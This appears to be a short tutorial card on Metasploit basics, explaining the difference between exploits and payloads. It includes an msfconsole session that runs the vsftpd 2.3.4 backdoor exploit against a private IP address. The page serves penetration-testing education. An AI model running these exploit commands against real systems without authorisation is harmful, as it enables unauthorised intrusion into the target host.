---
title: "Metasploit Framework: Exploit & Payload Basics"
layout: default
category: "Cybersecurity"
date: 2026-11-01
tags:
  - kali
  - security
status: "Published"
challenge: "In Metasploit, what is the difference between an `Exploit` and a `Payload`?"
answer: "An **Exploit** takes advantage of a specific software bug to gain entry; a **Payload** is the malicious/auditing code (like a reverse shell) executed on the target once entry is achieved."
---

### 💡 WHY (The Concept)
**Metasploit** is the world's most popular penetration testing framework, automating vulnerability verification.

### ⚖️ THE LOGICAL DECISION
Use Metasploit in security audits to prove whether an unpatched vulnerability can actually be exploited in practice.

### ⚙️ HOW (Implementation Code)
```bash
# Launch Metasploit Console:
msfconsole -q

# Search for vulnerabilities and configure module:
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.1.50
msf6 > exploit
```
